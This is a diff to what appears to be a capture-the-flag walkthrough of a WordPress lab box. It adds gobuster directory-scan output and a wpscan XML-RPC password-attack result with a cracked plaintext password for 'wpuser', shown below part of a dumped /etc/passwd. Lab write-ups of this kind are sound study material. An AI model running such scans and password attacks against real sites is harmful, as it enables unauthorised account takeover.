@@ -23,6 +23,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
 
+**gobuster**
+root@ip-10-10-10-170:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://www.smol.thm
+/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
+/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
+/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
+Progress: 87664 / 87665 (100.00%)
+
+
 **wpscan**
 root@ip-10-10-10-170:~# wpscan  --url http://www.smol.thm
 _______________________________________________________________
@@ -291,6 +299,11 @@ diego:x:1002:1002::/home/diego:/bin/bash
 gege:x:1003:1003::/home/gege:/bin/bash
 ssm-user:x:1004:1006::/home/ssm-user:/bin/sh
 ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
+
+[+] Performing password attack on Xmlrpc against 6 user/s
+[SUCCESS] - wpuser / kbLSF2Vop#lw3rjDZ629*Z%G              
+
+
 
 <\code>
 
